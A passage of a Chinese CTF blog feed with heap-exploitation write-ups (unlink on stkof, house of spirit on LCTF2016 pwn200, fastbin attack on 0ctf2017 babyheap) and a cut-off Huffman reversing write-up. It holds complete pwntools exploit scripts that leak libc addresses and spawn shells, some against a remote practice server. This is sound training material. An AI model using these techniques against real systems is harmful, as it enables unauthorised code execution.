class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> elftools.construct <span class="hljs-keyword">import</span> lib<br><span class="hljs-keyword">from</span> elftools.elf.sections <span class="hljs-keyword">import</span> Symbol<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><br><span class="hljs-comment">#libc_file_name = &#x27;/home/pandaos/Projects/pwn/glibc/2.23/64/lib/libc-2.23.so&#x27;</span><br>libc_file_name = <span class="hljs-string">&#x27;/home/pandaos/Projects/pwn/glibc/buu/ubuntu16/libc-2.23.so&#x27;</span><br>ld_file_name = <span class="hljs-string">&#x27;/home/pandaos/Projects/pwn/glibc/buu/ubuntu16/ld-linux-x86-64.so.2&#x27;</span><br><br><span class="hljs-comment"># p = process([ld_file_name, &#x27;./stkof&#x27;],</span><br><span class="hljs-comment">#            env = &#123;&quot;LD_PRELOAD&quot;: libc_file_name&#125;)</span><br>p = remote(<span class="hljs-string">&#x27;node3.buuoj.cn&#x27;</span>, <span class="hljs-number">29213</span>)<br><br>libc = ELF(libc_file_name)<br>elf = ELF(<span class="hljs-string">&#x27;stkof&#x27;</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">new_note</span>(<span class="hljs-params">size</span>):</span><br>    p.sendline(<span class="hljs-string">&#x27;1&#x27;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(size))<br>  <br>    p.recvuntil(<span class="hljs-string">&#x27;OK&#x27;</span>)<br>   <br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit_note</span>(<span class="hljs-params">idx, content</span>):</span><br>    p.sendline(<span class="hljs-string">&#x27;2&#x27;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(idx))<br>    p.sendline(<span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>(content)))<br>    p.send(content)<br>    p.recvuntil(<span class="hljs-string">&#x27;OK&#x27;</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free_note</span>(<span class="hljs-params">idx</span>):</span><br>    p.sendline(<span class="hljs-string">&#x27;3&#x27;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(idx))<br>    p.recvuntil(<span class="hljs-string">&#x27;OK&#x27;</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">call</span>(<span class="hljs-params">idx</span>):</span><br>    p.sendline(<span class="hljs-string">&#x27;4&#x27;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(idx))<br><br><br>new_note(<span class="hljs-number">0x50</span>)<br>edit_note(<span class="hljs-number">1</span>, <span class="hljs-string">&#x27;A&#x27;</span> * <span class="hljs-number">0x50</span>)<br><br>new_note(<span class="hljs-number">0x100</span>)<br>edit_note(<span class="hljs-number">2</span>, <span class="hljs-string">&#x27;B&#x27;</span> * <span class="hljs-number">0x100</span>)<br><br>new_note(<span class="hljs-number">0x100</span>)<br>edit_note(<span class="hljs-number">3</span>, <span class="hljs-string">&#x27;C&#x27;</span> * <span class="hljs-number">0x100</span>)<br><br><br>new_note(<span class="hljs-number">0x100</span>)<br>edit_note(<span class="hljs-number">4</span>, <span class="hljs-string">&#x27;E&#x27;</span> * <span class="hljs-number">0x100</span>)<br><br>new_note(<span class="hljs-number">0x100</span>)<br>edit_note(<span class="hljs-number">5</span>, <span class="hljs-string">&#x27;F&#x27;</span> * <span class="hljs-number">0x100</span>)<br><br>new_note(<span class="hljs-number">0x100</span>)<br>edit_note(<span class="hljs-number">6</span>, <span class="hljs-string">&#x27;/bin/sh&#x27;</span>)<br><br><br>target = <span class="hljs-number">0x602160</span><br>fake_chunk = p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x101</span>) + p64(target - <span class="hljs-number">0x18</span>) + p64(target - <span class="hljs-number">0x10</span>) + <span class="hljs-string">b&#x27;D&#x27;</span> * <span class="hljs-number">0xE0</span> + p64(<span class="hljs-number">0x100</span>) + p64(<span class="hljs-number">0x110</span>)<br>edit_note(<span class="hljs-number">4</span>, fake_chunk)<br>free_note(<span class="hljs-number">5</span>)<br>edit_note(<span class="hljs-number">4</span>, p64(<span class="hljs-number">0x602030</span>))<br>edit_note(<span class="hljs-number">1</span>, p64(elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>])) <span class="hljs-comment"># 修改 strlen.got =&gt; puts</span><br>edit_note(<span class="hljs-number">4</span>, p64(elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]))<br>call(<span class="hljs-number">1</span>)<br>p.recvn(<span class="hljs-number">1</span>)<br>leak_puts = u64(p.recvn(<span class="hljs-number">6</span>) + <span class="hljs-string">b&#x27;\x00\x00&#x27;</span>)<br>libc_base = leak_puts - libc.symbols[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>print(<span class="hljs-string">&quot;libc base: &quot;</span>, <span class="hljs-built_in">hex</span>(libc_base))<br>edit_note(<span class="hljs-number">4</span>, p64(<span class="hljs-number">0x602030</span>))<br>edit_note(<span class="hljs-number">1</span>, p64(libc_base + libc.symbols[<span class="hljs-string">&#x27;system&#x27;</span>]))<br>call(<span class="hljs-number">6</span>)<br><span class="hljs-comment"># gdb.attach(p)</span><br><span class="hljs-comment"># input(&#x27;&gt;&gt;&#x27;)</span><br>p.interactive()<br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>PWN</tag>
      
      <tag>heap</tag>
      
      <tag>unlink</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>house of spirit</title>
    <link href="/2021/06/10/house-of-spirit/"/>
    <url>/2021/06/10/house-of-spirit/</url>
    
    <content type="html"><![CDATA[<h1 id="house-of-spirit"><a href="#house-of-spirit" class="headerlink" title="house of spirit"></a>house of spirit</h1><p>这种利用方式主要是在栈上构造 fake chunk，从而更好的控制栈，修改返回地址。</p><p>利用条件： </p><ol><li>free(p) 中的 p 可控</li><li>可以泄漏栈地址</li><li>不可控区域前后都有区域可控（如图）</li></ol><img src="/2021/06/10/house-of-spirit/image-20210610233920442.png" class="" title="image-20210610233920442"><p>利用思路：</p><p>在栈中构造 fake chunk，大小覆盖掉函数的返回地址，再次分配得到返回地址控制，写入 one_gadget 或者 shellcode 地址。</p><p>注意如果构造 fastbin，free 函数会检测 next chunk 的大小与当前的 fake chunk 大小是否一致，需要绕过!</p><p>另外 fake fastbin chunk 的条件</p><ul><li>fake chunk 的 ISMMAP 位不能为 1，因为 free 时，如果是 mmap 的 chunk，会单独处理。</li><li>fake chunk 地址需要对齐， MALLOC_ALIGN_MASK</li><li>fake chunk 的 size 大小需要满足对应的 fastbin 的需求，同时也得对齐。</li><li>fake chunk 的 next chunk 的大小不能小于 2 * SIZE_SZ，同时也不能大于 av-&gt;system_mem 。</li><li>fake chunk 对应的 fastbin 链表头部不能是该 fake chunk，即不能构成 double free 的情况。</li></ul><h2 id="LCTF2016-pwn200"><a href="#LCTF2016-pwn200" class="headerlink" title="LCTF2016  pwn200"></a>LCTF2016  pwn200</h2><p>这个也是 BUU 上的一道经典例题</p><ol><li><p>该题的栈有 RWX 权限，可以放 shellcode</p></li><li><p>存在 rbp 地址泄漏</p> <img src="/2021/06/10/house-of-spirit/image-20210610235253636.png" class="" title="image-20210610235253636"><p> v2 填满 shellcode 后地址</p></li></ol><ol start="3"><li><p>sub_400A29 存在栈溢出，只能溢出掉 free(p) 中的 p 参数</p> <img src="/2021/06/10/house-of-spirit/image-20210610234812266.png" class="" title="image-20210610234812266"><p> 如图， buf 只有 58 字节，read 可以读入 64 字节，溢出 dest 变量。ptr 指针在后面的操作中会被当作 free 的参数</p></li><li><p>sub_400A29 调用之前的栈可控，构造 next chunk 的 size 域</p> <img src="/2021/06/10/house-of-spirit/image-20210610235059243.png" class="" title="image-20210610235059243"></li></ol><p>解题思路</p><p>who are u? 传 shellcode 并填充满 42 字节泄漏 rbp</p><p>give me your id ~~? 传入 fake chunk 的大小，这里可以控制 fake chunk 的 next chunk 的 size 域。</p><p>give me money~ 传入 fake chunk，并修改 ptr 变量为 fake chunk 地址</p><p>先选 choice 1，free(ptr)，将 fake chunk 插入到 fastbin</p><p>再选 choice 2，从 fastbin 从分配出栈内存，并修改地址为 shellcode 的地址</p><p>完整 exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>libc_file_name = <span class="hljs-string">&#x27;/home/pandaos/Projects/pwn/glibc/buu/ubuntu16/libc-2.23.so&#x27;</span><br><span class="hljs-comment">#libc_file_name = &#x27;/home/pandaos/Projects/pwn/glibc/2.23/64/lib/libc-2.23.so&#x27;</span><br>ld_file_name = <span class="hljs-string">&#x27;/home/pandaos/Projects/pwn/glibc/buu/ubuntu16/ld-linux-x86-64.so.2&#x27;</span><br><br>p = process([ld_file_name, <span class="hljs-string">&#x27;./pwn200&#x27;</span>],<br>           env = &#123;<span class="hljs-string">&quot;LD_PRELOAD&quot;</span>: libc_file_name&#125;)<br><br><span class="hljs-comment"># p = remote(&#x27;node3.buuoj.cn&#x27;, 25523)</span><br><br><span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;&gt;&gt;&quot;</span>)<br>p.recvuntil(<span class="hljs-string">&#x27;who are u?\n&#x27;</span>)<br><br>shellcode = asm(shellcraft.amd64.linux.sh(), arch=<span class="hljs-string">&#x27;amd64&#x27;</span>)<br>print(<span class="hljs-string">&quot;shellcode len:&quot;</span> , <span class="hljs-built_in">len</span>(shellcode))<br>p.send(shellcode)<br>p.recvn(<span class="hljs-number">48</span>)<br>leak_rbp = u64(p.recvn(<span class="hljs-number">6</span>) + <span class="hljs-string">b&#x27;\x00\x00&#x27;</span>)<br>print(<span class="hljs-string">&quot;leak rbp: &quot;</span>, <span class="hljs-built_in">hex</span>(leak_rbp))<br><br>p.recvuntil(<span class="hljs-string">&#x27;give me your id ~~?\n&#x27;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(<span class="hljs-number">0x61</span>))<br>p.recvuntil(<span class="hljs-string">&#x27;give me money~\n&#x27;</span>)<br><span class="hljs-comment"># 64</span><br>fake_chunk = <span class="hljs-string">b&#x27;A&#x27;</span> * <span class="hljs-number">8</span> + p64(<span class="hljs-number">0x61</span>) + <span class="hljs-string">b&#x27;B&#x27;</span> * <span class="hljs-number">40</span> + p64(leak_rbp - <span class="hljs-number">0xc0</span> + <span class="hljs-number">0x10</span>)<br>p.send(fake_chunk)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">choice</span>(<span class="hljs-params">s</span>):</span><br>    p.recvuntil(<span class="hljs-string">&#x27;your choice : &#x27;</span>)<br>    p.sendline(s)<br><br>choice(<span class="hljs-string">&#x27;2&#x27;</span>)<br>choice(<span class="hljs-string">&#x27;1&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">&#x27;how long?\n&#x27;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(<span class="hljs-number">0x50</span>))<br>p.recvuntil(<span class="hljs-string">&#x27;\n%d\n&#x27;</span> % <span class="hljs-number">0x50</span>)<br>p.sendline(<span class="hljs-string">b&#x27;D&#x27;</span> * <span class="hljs-number">56</span> + p64(leak_rbp - <span class="hljs-number">0x50</span>))<br><span class="hljs-comment">#choice(&#x27;3&#x27;)</span><br>p.interactive()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>PWN</tag>
      
      <tag>heap</tag>
      
      <tag>fastbin</tag>
      
      <tag>house_of_spirit</tag>
      
      <tag>shellcode</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>0cft2017 babyheap</title>
    <link href="/2021/06/10/0cft2017-babyheap/"/>
    <url>/2021/06/10/0cft2017-babyheap/</url>
    
    <content type="html"><![CDATA[<h1 id="0ctf2017-babyheap"><a href="#0ctf2017-babyheap" class="headerlink" title="0ctf2017 babyheap"></a>0ctf2017 babyheap</h1><p>复现了一道非常经典简单的堆题</p><p>分两步: </p><ol><li>泄漏 libc 地址</li><li>fastbin attack 修改 _malloc_hook</li></ol><p>有一个堆溢出洞，写内存时没有做长度限制。<br>观察一下，虽然开启了地址随机化，但是 Chunk 地址的最后一字节总是固定的，这意味着修改低位字节能在不泄漏地址的情况下指向其它 chunk。</p><p>可以构造两个 fastbin 中的 chunk1 和 chunk2 ，其中一个 chunk1-&gt;fd 指向  chunk2，利用 chunk1 的物理前一个 chunk 修改 chunk1-&gt;fd 的最高字节，使其指向<em>将来</em>要放到 unsorted bin 中的 chunk3 (提前分配大于0x80)。</p><p>此时: chunk1-&gt;fd = chunk3 (将来会放入unsorted bin)</p><p>通过 chunk3 物理前一个 chunk 修改chunk3-&gt;size 字段, 使其与 chunk1-&gt; size 相等，然后再申请两次 fastbin 得到 chunk3 的内存B。</p><p>得到 chunk3 的地址后，将 chunk3-&gt;size 还原，再释放 chunk3 ，使其进入 unsorted bin，由于此时 unsorted bin 中只有一个chunk，故 fd 指向 main_arena 中的地址，利用第二次申请 chunk3 内存读取 fd 即可。</p><ol start="2"><li>劫持 _malloc_hook 执行 one_gadget</li></ol><p>fastbin 伪造，只要把 size 搞好就行，_malloc_hook 附近有很多 0x7f，malloc 只会检测对齐后的长度，所以 0x7f 是可以用的，用 0x71 伪造 fastbin， 并使其 fd 字段指向 _malloc_hook 附近的 7f 00 00 00 00 前 8 字节地址。</p><p>one_gadget 条件不太好满足，大多数对栈有要求</p><img src="/2021/06/10/0cft2017-babyheap/image-20210610201008781.png" class="" title="image-20210610201008781"><p>可以进一步利用 realloc_hook 调整栈</p><p>即 malloc_hook 设置为 realloc，再由 realloc_hook 跳转到 one_gadget, 这是因为 realloc 头部有很多 push 指令可以调整栈</p><p>realloc_hook 与 malloc_hook 相邻，可以一起改写</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">realloc = libc_base + libc.symbols[<span class="hljs-string">&#x27;realloc&#x27;</span>]<br>realloc_off = <span class="hljs-number">0x2</span> * <span class="hljs-number">2</span><br>fill(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;A&#x27;</span> * <span class="hljs-number">0xb</span> + p64(one_gadget) + p64(realloc + realloc_off))<br><span class="hljs-comment"># 可以记一下固定偏移 _malloc_hook - 0x23 可以用来构造 fastbin chunk，大小0x7f</span><br></code></pre></td></tr></table></figure><p>realloc 头部有很多 push 指令可以用于调整栈，加上适当的偏移 <code>realloc_off</code> 就可以控制压栈数量，从而使 one_gadget 条件满足。</p><p>另外记录一下 main_arena 偏移获取，题目给的 libc 没有调试符号，symbols 里面没有 main_arena，这种情况就只能自己手动找偏移</p><p>用 IDA 打开 libc，定位到 <code>malloc_trim</code> 函数</p><img src="/2021/06/10/0cft2017-babyheap/image-20210610202152312.png" class="" title="image-20210610202152312"><p>此处的 3C4B20 即为 <code>main_arena </code> 偏移</p><p>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>libc_file_name = <span class="hljs-string">&#x27;/home/pandaos/Projects/pwn/glibc/buu/ubuntu16/libc-2.23.so&#x27;</span><br>ld_file_name = <span class="hljs-string">&#x27;/home/pandaos/Projects/pwn/glibc/buu/ubuntu16/ld-linux-x86-64.so.2&#x27;</span><br><br><span class="hljs-comment"># p = process([ld_file_name, &#x27;./0ctf_2017_babyheap&#x27;],</span><br><span class="hljs-comment">#            env = &#123;&quot;LD_PRELOAD&quot;: libc_file_name&#125;)</span><br><br>libc = ELF(libc_file_name)<br>p = remote(<span class="hljs-string">&#x27;node3.buuoj.cn&#x27;</span>, <span class="hljs-number">29896</span>)<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">alloc</span>(<span class="hljs-params">size</span>):</span><br>    p.recvuntil(<span class="hljs-string">&#x27;Command: &#x27;</span>)<br>    p.sendline(<span class="hljs-string">&#x27;1&#x27;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(size))<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">fill</span>(<span class="hljs-params">idx,payload</span>):</span><br>    p.recvuntil(<span class="hljs-string">&#x27;Command: &#x27;</span>)<br>    p.sendline(<span class="hljs-string">&#x27;2&#x27;</span>) <br>    p.sendline(<span class="hljs-built_in">str</span>(idx))<br>    p.sendline(<span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>(payload)))<br>    p.send(payload) <br>    <br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span>(<span class="hljs-params">idx</span>):</span><br>    p.recvuntil(<span class="hljs-string">&#x27;Command: &#x27;</span>)<br>    p.sendline(<span class="hljs-string">&#x27;3&#x27;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(idx))   <br>    <br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">dump</span>(<span class="hljs-params">idx</span>):</span><br>    p.recvuntil(<span class="hljs-string">&#x27;Command: &#x27;</span>) <br>    p.sendline(<span class="hljs-string">&#x27;4&#x27;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(idx))    <br>    p.recvuntil(<span class="hljs-string">&#x27;Content: \n&#x27;</span>)<br><br>alloc(<span class="hljs-number">0x8</span>)<br>alloc(<span class="hljs-number">0x8</span>)<br>alloc(<span class="hljs-number">0x8</span>)<br>alloc(<span class="hljs-number">0x8</span>)<br>alloc(<span class="hljs-number">0x80</span>)<br>alloc(<span class="hljs-number">0x8</span>)<br><br>free(<span class="hljs-number">0</span>)<br>free(<span class="hljs-number">2</span>)<br>fill(<span class="hljs-number">3</span>, <span class="hljs-string">b&#x27;B&#x27;</span> * <span class="hljs-number">0x18</span> + p64(<span class="hljs-number">0x21</span>))<br>fill(<span class="hljs-number">1</span>, <span class="hljs-string">b&#x27;A&#x27;</span> * <span class="hljs-number">0x18</span> + p64(<span class="hljs-number">0x21</span>) + <span class="hljs-string">b&#x27;\x80&#x27;</span>)<br>alloc(<span class="hljs-number">0x8</span>)<br>alloc(<span class="hljs-number">0x8</span>)<br>fill(<span class="hljs-number">3</span>, <span class="hljs-string">b&#x27;B&#x27;</span> * <span class="hljs-number">0x18</span> + p64(<span class="hljs-number">0x91</span>))<br>free(<span class="hljs-number">4</span>)<br>dump(<span class="hljs-number">2</span>)<br>leak_main_arena_off = u64(p.recvn(<span class="hljs-number">8</span>))<br>leak_main_arena = leak_main_arena_off - <span class="hljs-number">0x58</span><br>libc_base = leak_main_arena - <span class="hljs-number">0x3C4B20</span><br><br>print(<span class="hljs-string">&quot;leak main arena: &quot;</span>, <span class="hljs-built_in">hex</span>(leak_main_arena_off))<br>print(<span class="hljs-string">&quot;libc base: &quot;</span>, <span class="hljs-built_in">hex</span>(libc_base))<br><br>alloc(<span class="hljs-number">0x8</span>)<br>alloc(<span class="hljs-number">0x60</span>)<br>alloc(<span class="hljs-number">0x8</span>)<br><br><span class="hljs-comment">#free(4)</span><br>free(<span class="hljs-number">6</span>)<br>fill(<span class="hljs-number">4</span>, <span class="hljs-string">b&#x27;C&#x27;</span> * <span class="hljs-number">0x18</span> + p64(<span class="hljs-number">0x71</span>) + p64(leak_main_arena_off - <span class="hljs-number">0x83</span> - <span class="hljs-number">8</span>))<br>alloc(<span class="hljs-number">0x60</span>)<br>alloc(<span class="hljs-number">0x60</span>)<br><br>one_gadget = libc_base + <span class="hljs-number">0xf1147</span><br>realloc = libc_base + libc.symbols[<span class="hljs-string">&#x27;realloc&#x27;</span>]<br>realloc_off = <span class="hljs-number">0x2</span> * <span class="hljs-number">2</span><br>print(<span class="hljs-string">&quot;realloc: &quot;</span>, <span class="hljs-built_in">hex</span>(realloc))<br>print(<span class="hljs-string">&quot;one gadget: &quot;</span>, <span class="hljs-built_in">hex</span>(one_gadget))<br>fill(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;A&#x27;</span> * <span class="hljs-number">0xb</span> + p64(one_gadget) + p64(realloc + realloc_off))<br><br><span class="hljs-comment"># gdb.attach(p, &#x27;b *&#x27; + hex(one_gadget))</span><br><span class="hljs-comment"># input(&quot;&gt;&gt;&quot;)</span><br>alloc(<span class="hljs-number">0x8</span>)<br>p.interactive()<br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>PWN</tag>
      
      <tag>heap</tag>
      
      <tag>fastbin</tag>
      
      <tag>one_gadget</tag>
      
      <tag>overlap</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Redhat-filestore</title>
    <link href="/2021/05/28/Redhat-filestore/"/>
    <url>/2021/05/28/Redhat-filestore/</url>
    
    <content type="html"><![CDATA[<h1 id="红帽杯2021-file-store"><a href="#红帽杯2021-file-store" class="headerlink" title="红帽杯2021 file_store"></a>红帽杯2021 file_store</h1><p>题目下载: <a href="/2021/05/28/Redhat-filestore/file_store.zip" title="file_store.zip">file_store.zip</a></p><p>做这道题之前可以先学习一下 Huffman 编码，同时这道题还涉及到大量的 stl 使用，可以锻炼 stl 逆向分析能力。Huffman 一般用于数据压缩，与题目名比较吻合。这道题其实是利用 Huffman 编码对 flag 文件进行编码，解题方法是解压 Huffman 编码过的文件即可。</p><p>这道题压缩方案是利用传统 Huffman 树构造方法，统计词频并根据词频高低构造 Huffman 树，用 01 串表示词在 Huffman 树中的位置，最后将 01 串转换成字节流。</p><p>要解压缩某个数据，必须要有该数据文件对应的 Huffman 树的结构，因此题目提供了 flag.txt.shuffled 文件，该文件打乱了 flag.txt 的顺序，但是词频没有变，使用该文件构造 Huffman 树，即可对 flag.bin 解压。</p><p>⚠️这道题中，词 = 字符，词频就是字符出现的次数</p><h2 id="Huffman-树的构造"><a href="#Huffman-树的构造" class="headerlink" title="Huffman 树的构造"></a>Huffman 树的构造</h2><p>函数地址: 40184A</p><ol><li>词频统计 </li></ol><p>Huffman 树中节点的构造依赖于词频分析，“词”的含义不是一个单词，而是一个字节。词频越高意味使用次数越多，就越靠近跟节点，01 串表示的路径就跟短，有利于压缩。</p><img src="/2021/05/28/Redhat-filestore/image-20210528022418649.png" class="" title="image-20210528022418649"><p>逆向 stl 的时候经常遇到 “迭代器” </p><ol start="2"><li>为每一个不重复的字符创建 Huffman 节点，高度为1，并将新创建的节点加入到 Huffman 森林（arrayResult 数组）</li></ol><img src="/2021/05/28/Redhat-filestore/image-20210528022544914.png" class="" title="image-20210528022544914"><ol start="3"><li>从 Huffman 森林中选出某些树合并</li></ol><p>标准 Huffman 树是选出权制最小的两棵子树合并，但是这道题似乎并不是这样</p><img src="/2021/05/28/Redhat-filestore/image-20210528022925031.png" class="" title="image-20210528022925031"><p>循环退出的条件是 Huffman 森林中只有一颗🌲</p><ol start="4"><li>遍历计算路径 函数地址: 4016D6</li></ol><p>0 代表走左，1代表走右</p><img src="/2021/05/28/Redhat-filestore/image-20210528023701996.png" class="" title="image-20210528023701996"><p>遍历函数到达叶子结点的时候，将 01 路径串与字符通过 stl map 建立关联。</p><p>输入文件 flag.txt.shuffled ，并在此处尝试 dump 关联的键值对即可获取 01串与真实数据之间的编码关系.</p><p>dump ida 脚本如下, 该脚本使用方法是在 <code>40171D call    find</code> 处设置条件断点为 bp_dumper() 即可.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> idaapi<br><span class="hljs-keyword">import</span> idc<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">decode_stl_str</span>(<span class="hljs-params">p</span>):</span><br>    size = idc.read_dbg_qword(p + <span class="hljs-number">0x8</span>)<br>    dataPtr = idc.read_dbg_qword(p)<br>    buf = []<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(size):<br>        buf.append(idc.read_dbg_byte(dataPtr + i))<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">bytearray</span>(buf)<br><br><span class="hljs-comment"># bp 40171D</span><br>reverseMap = &#123;&#125;<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">bp_dumper</span>():</span><br>    <span class="hljs-keyword">global</span> reverseMap<br>    pNodeVal = idc.get_reg_value(<span class="hljs-string">&#x27;rsi&#x27;</span>)<br>    nodeVal = idc.read_dbg_byte(pNodeVal)<br>    rbp = idc.get_reg_value(<span class="hljs-string">&#x27;rbp&#x27;</span>)<br>    pStr = idc.read_dbg_qword(rbp - <span 